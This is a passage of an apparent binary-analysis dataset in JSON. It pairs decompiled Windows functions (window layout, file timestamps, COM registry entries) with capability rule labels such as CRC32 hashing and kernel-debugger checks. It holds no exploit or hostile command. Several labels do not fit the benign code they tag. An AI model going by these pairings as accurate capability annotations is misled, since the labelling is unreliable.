(*pcVar2)(iVar5, 0x36d, param_2, 0);\n        }\n        uVar7 = 2;\n    }\n    return;\n}\n",
        "token_count": 492
    },
    "0044755b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044755b(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.0041901a();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00429f7a();\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00432d0d(arg_ch, uVar1 * 4);\n            arg_ch = arg_ch + uVar1 * 4;\n        }\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "00448c54": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448c54(uint arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint *var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    var_ch = NULL;\n    var_8h = NULL;\n    var_4h = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(arg_8h);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (var_4h == 0xffffffff) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(arg_8h);\n        fcn.0044558c(uVar2);\n    }\n    if ((*(arg_ch + 8) != var_4h) && ((var_4h & 1) != 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetFileAttributesA)(arg_8h, *(arg_ch + 8));\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.0044558c(uVar2);\n        }\n    }\n    if ((arg_ch[2] | arg_ch[3]) != 0) {\n        fcn.00448bb9(arg_ch + 2, &var_24h);\n        if ((arg_ch[4] | arg_ch[5]) != 0) {\n            fcn.00448bb9(arg_ch + 4, &var_14h);\n            var_8h = &var_14h;\n        }\n        if ((*arg_ch | arg_ch[1]) != 0) {\n            fcn.00448bb9(arg_ch, &var_1ch);\n            var_ch = &var_1ch;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n        if (iVar3 == -1) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.0044558c(uVar2);\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar3, var_ch, var_8h, &var_24h);\n        if (iVar4 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.0044558c(uVar2);\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.0044558c(uVar2);\n        }\n    }\n    if ((*(arg_ch + 8) != var_4h) && ((var_4h & 1) == 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetFileAttributesA)(arg_8h, *(arg_ch + 8));\n        if (iVar3 == 0) {\n            uVar2 = (*pcVar1)(arg_8h);\n            fcn.0044558c(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 756
    },
    "004492c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004492c6(uint *param_1, uint8_t param_2)\n\n{\n    if (param_1[2] != 0) {\n        fcn.004170df(*param_1);\n    }\n    if ((param_2 & 1) != 0) {\n        fcn.004170df(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 90
    },
    "004497e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004497e8(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.0041901a();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0xaaaaaaa;\n            if (arg_10h < 0xaaaaaaa) {\n                uVar1 = arg_10h;\n            }\n            fcn.00429f7a();\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0xaaaaaaa;\n            if (arg_10h < 0xaaaaaaa) {\n                uVar1 = arg_10h;\n            }\n            fcn.00432d0d(arg_ch, uVar1 * 0xc);\n            arg_ch = arg_ch + uVar1 * 0xc;\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "0044d502": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d502(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t *var_8h;\n    int32_t *piStack8;\n    \n    uVar1 = param_1[0x20];\n    param_1[0x28] = 0;\n    if (((uVar1 & 1) == 0) || ((uVar1 & 4) == 0)) {\n        if ((uVar1 & 0xa000) == 0) {\n            uVar2 = 0x50;\n        }\n        else {\n            uVar2 = 0x4a;\n        }\n    }\n    else {\n        uVar2 = 0x46;\n    }\n    var_8h = param_1;\n    piStack8 = param_1;\n    (**(*param_1 + 0x138))(&var_8h, 0, uVar2);\n    return;\n}\n",
        "token_count": 218
    },
    "0044d580": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044d580(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    iVar6 = 0;\n    var_4h = 0;\n    if (arg_ch < 1) {\ncode_r0x0044d643:\n        return var_4h + 1;\n    }\ncode_r0x0044d59e:\n    piVar1 = iVar3 * 0x14 + arg_8h;\n    piVar4 = piVar1 + 2;\n    *piVar4 = *piVar4 & 0xdf;\n    if ((*piVar4 & 8) == 0) {\n        if ((*(piVar1 + 9) & 1) == 0) {\n            iVar2 = *(in_ECX + 0xac);\n        }\n        else {\n            iVar2 = *piVar1;\n        }\n        iVar6 = iVar6 + iVar2;\n        iVar2 = iVar3;\n        if (arg_10h < iVar6) {\n            for (; (-1 < iVar2 && ((*piVar4 & 0x20) == 0)); piVar4 = piVar4 + -5) {\n                if (((*(piVar4 + 1) & 1) != 0) && ((piVar4[-1] == 0 && ((*piVar4 & 8) == 0)))) goto code_r0x0044d626;\n                iVar2 = iVar2 + -1;\n            }\n            iVar2 = iVar3 + -1;\n            if (-1 < iVar2) {\n                puVar5 = iVar2 * 0x14 + 8 + arg_8h;\n                do {\n                    if ((*puVar5 & 0x20) != 0) break;\n                    if (((*puVar5 & 8) == 0) && (((puVar5[1] & 1) == 0 || (*(puVar5 + -4) == 0))))\n                    goto code_r0x0044d626;\n                    iVar2 = iVar2 + -1;\n                    puVar5 = puVar5 + -0x14;\n                } while (-1 < iVar2);\n            }\n        }\n    }\n    goto code_r0x0044d637;\ncode_r0x0044d626:\n    puVar5 = iVar2 * 0x14 + 8 + arg_8h;\n    *puVar5 = *puVar5 | 0x20;\n    iVar6 = 0;\n    var_4h = var_4h + 1;\n    iVar3 = iVar2;\ncode_r0x0044d637:\n    iVar3 = iVar3 + 1;\n    if (arg_ch <= iVar3) goto code_r0x0044d643;\n    goto code_r0x0044d59e;\n}\n",
        "token_count": 701
    },
    "0044dca2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0044dca2(uint arg_8h, int32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint *puVar4;\n    uint *arg_8h_00;\n    uint var_30h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint8_t var_fh;\n    uint var_eh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    arg_8h_00 = &var_18h;\n    (**(*in_ECX + 0x110))(0x417, arg_8h);\n    *(arg_ch + 2) = *(arg_ch + 2) ^ 4;\n    var_eh._0_1_ = 0;\n    var_eh._1_1_ = 0;\n    *(arg_ch + 10) = 0;\n    *(arg_ch + 0xb) = 0;\n    iVar2 = fcn.0045ac18(arg_ch, &var_18h, 0x14);\n    if (iVar2 != 0) {\n        uVar3 = fcn.004225b8();\n        var_20h = uVar3;\n        fcn.004225ec(0x10000000, 0, 0);\n        (**(*in_ECX + 0x110))(0x416, arg_8h, 0);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        if (arg_ch[4] < -1) {\n            var_1ch = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], 0x43d, 0, 0);\n            (*pcVar1)(in_ECX[8], 0xb, 0, 0);\n            (*pcVar1)(in_ECX[8], 0x43c, var_1ch + 1, 0);\n            (*pcVar1)(in_ECX[8], 0x43c, var_1ch, 0);\n            (*pcVar1)(in_ECX[8], 0xb, 1, 0);\n            arg_ch[4] = arg_ch[4] + 1000000;\n            uVar3 = var_20h;\n        }\n        (**(*in_ECX + 0x110))(0x415, arg_8h, arg_ch);\n        fcn.004225ec(0, uVar3 & 0x10000000, 0);\n        if ((((*(arg_ch + 9) ^ var_fh) & 1) == 0) && (((*(arg_ch + 9) & 1) == 0 || (*arg_ch == var_18h)))) {\n            iVar2 = (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_30h);\n            if (iVar2 == 0) goto code_r0x0044ddf5;\n            puVar4 = &var_30h;\n        }\n        else {\n            puVar4 = NULL;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(in_ECX[8], puVar4, 1);\n    }\ncode_r0x0044ddf5:\n    fcn.004566a8(arg_8h_00);\n    return;\n}\n",
        "token_count": 789
    },
    "0044dea0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0044dea0(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar7 = *in_ECX;\n    var_ch = 0;\n    var_8h = 0;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    uVar2 = (**(iVar7 + 0x110))(0x455, 0, 0);\n    if (0 < arg_10h) {\n        puVar8 = arg_ch + 9;\n        arg_ch = arg_10h;\n        do {\n            arg_10h = *(puVar8 + -9);\n            uVar3 = fcn.004225b8();\n            if (((uVar3 & 0x800) == 0) && (*0x4a9b88 != 0x40047)) {\n                arg_10h = (arg_10h * 2) / 3;\n            }\n            if ((puVar8[-1] & 8) == 0) {\n                uVar1 = *puVar8;\n                iVar7 = in_ECX[0x2b];\n                if ((uVar1 & 1) == 0) {\n                    if (((uVar1 & 8) != 0) && ((uVar2 & 1) != 0)) {\n                        iVar7 = iVar7 + *0x4a9b8c;\n                    }\n                    iVar4 = var_ch + iVar7;\n                    if (var_ch + iVar7 <= *arg_8h) {\n                        iVar4 = *arg_8h;\n                    }\n                    *arg_8h = iVar4;\n                    iVar4 = in_ECX[0x2c];\n                    iVar6 = var_8h;\ncode_r0x0044df79:\n                    iVar5 = iVar4 + iVar6;\n                    if (iVar4 + iVar6 <= arg_8h[1]) {\n                        iVar5 = arg_8h[1];\n                    }\n                    arg_8h[1] = iVar5;\n                }\n                else {\n                    if ((puVar8[-1] & 0x20) != 0) {\n                        iVar4 = in_ECX[0x2c] + var_8h;\n                        iVar6 = arg_10h;\n                        goto code_r0x0044df79;\n                    }\n                    iVar4 = *(puVar8 + -9) + var_ch;\n                    if (*(puVar8 + -9) + var_ch <= *arg_8h) {\n                        iVar4 = *arg_8h;\n                    }\n                    *arg_8h = iVar4;\n                }\n                if ((uVar1 & 1) != 0) {\n                    iVar7 = *(puVar8 + -9);\n                }\n                var_ch = var_ch + iVar7;\n                if ((puVar8[-1] & 0x20) != 0) {\n                    var_8h = var_8h + in_ECX[0x2c];\n                    var_ch = 0;\n                    if ((uVar1 & 1) != 0) {\n                        var_8h = var_8h + arg_10h;\n                    }\n                }\n            }\n            puVar8 = puVar8 + 0x14;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 847
    },
    "0044e81b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpRect\n\nint32_t * __cdecl fcn.0044e81b(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t arg_ch_00;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    uint32_t lpRect;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t lprc;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t *var_18h;\n    int32_t var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint32_t *var_4h;\n    \n    iVar6 = *in_ECX;\n    arg_8h_00 = 0x418;\n    var_4h = NULL;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    var_ch = (**(iVar6 + 0x110))(0x418, 0, 0);\n    if (var_ch == 0) goto code_r0x0044eb0d;\n    var_4h = fcn.004170b4(-(var_ch * 0x14 >> 0x20 != 0) | var_ch * 0x14);\n    puVar4 = NULL;\n    if (var_ch < 1) goto code_r0x0044eb0d;\n    do {\n        arg_8h_00 = puVar4;\n        fcn.0044d4a0();\n        arg_ch_00 = var_ch;\n        puVar4 = puVar4 + 1;\n    } while (puVar4 < var_ch);\n    uVar3 = 0;\n    if (var_ch < 1) goto code_r0x0044eb0d;\n    uVar1 = in_ECX[0x20];\n    if ((uVar1 & 2) == 0) {\n        if ((uVar1 & 4) == 0) {\ncode_r0x0044e916:\n            uVar3 = -((arg_ch & 2) != 0) & 0x7fff;\n        }\n        else if ((arg_ch & 4) == 0) {\n            if ((arg_ch & 8) == 0) {\n                if ((arg_ch & 0x10) == 0) {\n                    if (arg_10h == -1) {\n                        if ((uVar1 & 1) == 0) goto code_r0x0044e916;\n                        goto code_r0x0044e8b1;\n                    }\n                    (*_sym.imp.USER32.dll_SetRectEmpty)(&lprc);\n                    (**(*in_ECX + 0x140))(&lprc, arg_ch & 2);\n                    lpRect = arg_ch & 0x20;\n                    if (lpRect == 0) {\n                        var_28h = var_24h - lprc;\n                    }\n                    else {\n                        var_28h = var_20h - var_28h;\n                    }\n                    uVar3 = var_28h + arg_10h;\n                }\n                else {\n                    lpRect = 0;\n                }\n            }\n            else {\n                uVar3 = 0x7fff;\n            }\n        }\n        else {\ncode_r0x0044e8b1:\n            uVar3 = in_ECX[0x1c];\n        }\n        fcn.0044dfcf(var_4h, arg_ch_00, uVar3, lpRect);\n    }\n    arg_8h_00 = &var_24h;\n    piVar2 = fcn.0044dea0(arg_8h_00, var_4h, arg_ch_00);\n    iVar6 = piVar2[1];\n    *arg_8h = *piVar2;\n    arg_8h[1] = iVar6;\n    if ((arg_ch & 0x40) != 0) {\n        var_20h = in_ECX[0x28];\n        var_14h = 0;\n        arg_10h = 0;\n        in_ECX[0x28] = 0;\n        if (0 < arg_ch_00) {\n            var_18h = var_4h + 1;\n            puVar5 = var_18h;\n            uVar3 = arg_ch_00;\n            do {\n                if (((*(puVar5 + 5) & 1) != 0) && (*puVar5 != 0)) {\n                    arg_10h = arg_10h + 1;\n                }\n                puVar5 = puVar5 + 5;\n                uVar3 = uVar3 - 1;\n            } while (uVar3 != 0);\n            if (0 < arg_10h) {\n                var_14h = fcn.004170b4(-(arg_10h * 0x18 >> 0x20 != 0) | arg_10h * 0x18);\n                var_10h = var_14h + 8;\n                var_1ch = arg_10h;\n                arg_10h = 0;\n                var_8h = NULL;\n                puVar5 = var_10h;\n                do {\n                    arg_ch_00 = var_ch;\n                    if (var_1ch <= arg_10h) break;\n                    puVar7 = puVar5;\n                    if (((*(var_18h + 5) & 1) != 0) && (*var_18h != 0)) {\n                        puVar5[-2] = var_8h;\n                        puVar5[-1] = *var_18h;\n                        (**(*in_ECX + 0x170))(var_8h, &lpRect);\n                        arg_8h_00 = &lpRect;\n                        fcn.00419edd(arg_8h_00);\n                        arg_10h = arg_10h + 1;\n                        puVar7 = var_10h + 6;\n                        *puVar5 = lpRect;\n                        puVar5[1] = var_38h;\n                        puVar5[2] = var_34h;\n                        puVar5[3] = var_30h;\n                        var_10h = puVar7;\n                    }\n                    var_8h = var_8h + 1;\n                    var_18h = var_18h + 5;\n                    arg_ch_00 = var_ch;\n                    puVar5 = puVar7;\n                } while (var_8h < var_ch);\n            }\n        }\n        if (((in_ECX[0x20] & 1U) != 0) && ((in_ECX[0x20] & 4U) != 0)) {\n            in_ECX[0x1c] = *arg_8h;\n        }\n        var_8h = NULL;\n        if (0 < arg_ch_00) {\n            var_10h = var_4h;\n            do {\n                arg_8h_00 = var_8h;\n                fcn.0044dca2(var_8h, var_10h);\n                var_8h = var_8h + 1;\n                var_10h = var_10h + 5;\n            } while (var_8h < arg_ch_00);\n        }\n        if (0 < arg_10h) {\n            puVar5 = var_14h + 8;\n            do {\n                arg_8h_00 = puVar5[-1];\n                var_10h = puVar5;\n                var_1ch = fcn.0042244f();\n                if (var_1ch != 0) {\n                    (*_sym.imp.USER32.dll_GetWindowRect)(*(var_1ch + 0x20), &lpRect);\n                    iVar8 = var_38h - puVar5[1];\n                    iVar6 = lpRect - *puVar5;\n                    (**(*in_ECX + 0x170))(var_10h[-2], &lpRect);\n                    arg_8h_00 = NULL;\n                    fcn.00422a19(0, iVar6 + lpRect, iVar8 + var_38h, 0, 0, 0x15);\n                    puVar5 = var_10h;\n                }\n                puVar5 = puVar5 + 6;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n            var_10h = puVar5;\n            fcn.004170df(var_14h, arg_8h_00);\n        }\n        in_ECX[0x28] = var_20h;\n    }\n    fcn.004170df(var_4h);\ncode_r0x0044eb0d:\n    (*_sym.imp.USER32.dll_SetRectEmpty)(&lpRect, arg_8h_00);\n    (**(*in_ECX + 0x140))(&lpRect, arg_ch & 2);\n    arg_8h[1] = arg_8h[1] + (var_38h - var_30h);\n    *arg_8h = *arg_8h + (lpRect - var_34h);\n    fcn.00451ce8(&var_24h, arg_ch & 1, arg_ch & 2);\n    iVar6 = *arg_8h;\n    if (*arg_8h <= var_24h) {\n        iVar6 = var_24h;\n    }\n    *arg_8h = iVar6;\n    iVar6 = arg_8h[1];\n    if (arg_8h[1] <= var_20h) {\n        iVar6 = var_20h;\n    }\n    arg_8h[1] = iVar6;\n    return arg_8h;\n}\n",
        "token_count": 2281
    },
    "0044ef17": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044ef17(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint32_t uVar5;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_30h;\n    \n    iVar1 = fcn.0041e5da();\n    if (iVar1 != 0) {\n        var_50h = 0x50;\n        var_4ch = 0x11;\n        (**(*in_ECX + 0x110))(0x41d, arg_8h, &var_50h);\n        uVar2 = fcn.0041e6a5(var_30h);\n        piVar3 = fcn.004306fe(0x48fc28, uVar2);\n        if (piVar3 == NULL) {\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(var_30h, 0xfffffff0);\n            uVar4 = uVar4 >> 0x1c & 1;\n        }\n        else {\n            uVar4 = (**(*piVar3 + 0x154))();\n        }\n        uVar5 = ~(var_48h >> 3) & 1;\n        if (uVar4 != uVar5) {\n            (*_sym.imp.USER32.dll_ShowWindow)(var_30h, -(uVar5 != 0) & 5);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 360
    },
    "00451f0a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451f0a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(in_ECX + 0x20), 0x46, 0, arg_8h);\n    if ((*(arg_8h + 0x18) & 1) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x20), &lpRect);\n        var_4h = *(arg_8h + 0x10);\n        var_ch = var_ch - lpRect;\n        var_8h = var_8h - var_10h;\n        iVar1 = *(arg_8h + 0x14);\n        if ((var_4h != var_ch) && ((*(in_ECX + 0x80) & 0x400) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_4h - *0x4ad208, 0, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_ch - *0x4ad208, 0, var_ch, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n        }\n        pcVar2 = _sym.imp.USER32.dll_SetRect;\n        if ((iVar1 != var_8h) && ((*(in_ECX + 0x80) & 0x800) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, 0, iVar1 - *0x4ad20c, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n            (*pcVar2)(&lpRect, 0, var_8h - *0x4ad20c, var_4h, var_8h);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), &lpRect, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "00452236": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00452236(uint noname_0, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t lprcDst;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    uVar1 = (**(*in_ECX + 0x158))(arg_ch);\n    if (((uVar1 & 0x10000000) != 0) && ((uVar1 & 0xf000) != 0)) {\n        (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, arg_ch + 1);\n        iVar4 = var_14h - lprcDst;\n        iVar3 = var_10h - var_18h;\n        bVar5 = arg_ch[7] != 0;\n        if (((var_4h[0x20] & 4U) == 0) || ((var_4h[0x20] & 1U) == 0)) {\n            if ((uVar1 & 0xa000) == 0) {\n                uVar2 = bVar5 | 0x10;\n            }\n            else {\n                uVar2 = bVar5 | 10;\n            }\n        }\n        else {\n            uVar2 = bVar5 | 6;\n        }\n        (**(*var_4h + 0x138))(&var_ch, 0xffffffff, uVar2);\n        if (iVar4 <= var_ch) {\n            var_ch = iVar4;\n        }\n        if (iVar3 <= var_8h) {\n            var_8h = iVar3;\n        }\n        if ((uVar1 & 0xa000) == 0) {\n            if ((uVar1 & 0x5000) != 0) {\n                arg_ch[5] = arg_ch[5] + var_ch;\n                iVar3 = arg_ch[6];\n                if (arg_ch[6] <= var_8h) {\n                    iVar3 = var_8h;\n                }\n                arg_ch[6] = iVar3;\n                if ((uVar1 & 0x1000) == 0) {\n                    if ((uVar1 & 0x4000) != 0) {\n                        lprcDst = var_14h - var_ch;\n                        arg_ch[3] = arg_ch[3] - var_ch;\n                    }\n                }\n                else {\n                    arg_ch[1] = arg_ch[1] + var_ch;\n                }\n            }\n        }\n        else {\n            arg_ch[6] = arg_ch[6] + var_8h;\n            iVar3 = arg_ch[5];\n            if (arg_ch[5] <= var_ch) {\n                iVar3 = var_ch;\n            }\n            arg_ch[5] = iVar3;\n            if ((uVar1 & 0x2000) == 0) {\n                if (uVar1 < 0) {\n                    var_18h = var_10h - var_8h;\n                    arg_ch[4] = arg_ch[4] - var_8h;\n                }\n            }\n            else {\n                arg_ch[2] = arg_ch[2] + var_8h;\n            }\n        }\n        var_14h = lprcDst + var_ch;\n        var_10h = var_18h + var_8h;\n        if (*arg_ch != 0) {\n            fcn.0041c437(arg_ch, var_4h[8], &lprcDst);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 857
    },
    "00453d68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00453d68(uint arg_8h, uint hKey, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.ADVAPI32.dll_RegSetValueA;\n    uVar1 = arg_10h & 1;\n    if ((uVar1 == 0) ||\n       ((iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)(arg_8h, \"Insertable\", 1, 0x48a3e2, 0),  iVar3 == 0 &&\n        (iVar3 = (*pcVar2)(hKey, \"Insertable\", 1, 0x48a3e2, 0),  iVar3 == 0)))) {\n        pcVar4 = NULL;\n        if ((arg_10h & 2) != 0) {\n            pcVar4 = \"Apartment\";\n        }\n        if ((arg_10h & 4) != 0) {\n            pcVar4 = \"Free\";\n        }\n        if ((arg_10h & 6) == 6) {\n            pcVar4 = \"Both\";\n        }\n        if (pcVar4 != NULL) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(hKey, \"InprocServer32\", 0, 0x20006, &arg_10h);\n            bVar5 = iVar3 == 0;\n            if (bVar5) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar4);\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(arg_10h, \"ThreadingModel\", 0, 1, pcVar4, iVar3 + 1);\n                bVar5 = iVar3 == 0;\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(arg_10h);\n            }\n            else {\n                iVar3 = fcn.0042b7b9();\n                if (*(iVar3 + 0x14) == '\\0') {\n                    bVar5 = true;\n                }\n            }\n            if (bVar5 == false) goto code_r0x00453daa;\n        }\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\ncode_r0x00453daa:\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegDeleteValueA;\n        if (uVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(hKey, \"Insertable\");\n            (*pcVar2)(arg_8h, \"Insertable\");\n        }\n    }\n    return bVar5;\n}\n",
        "token_count": 627
    },
    "004544bf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004544bf(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t unaff_retaddr;\n    \n    if ((((param_2 >> 0x1f & 1U) == 0) || ((param_2 & 0x1fff0000) != 0x30000)) ||\n       (uVar2 = param_2 & 0xffff,  0xff < uVar2)) {\n        if ((param_2 == 0x80030100) || (((-0x7ffcff00 < param_2 && (-0x7ffcfefb < param_2)) && (param_2 == 0x80030106)))\n           ) {\n            uVar1 = 0xb;\n        }\n        else {\n            uVar1 = 1;\n        }\n    }\n    else {\n        uVar1 = fcn.004451f8(uVar2);\n        param_2 = uVar2;\n    }\n    *(unaff_retaddr + 8) = uVar1;\n    *(unaff_retaddr + 0xc) = param_2;\n    return;\n}\n",
        "token_count": 260
    },
    "00475a0f": {
        "rules": [
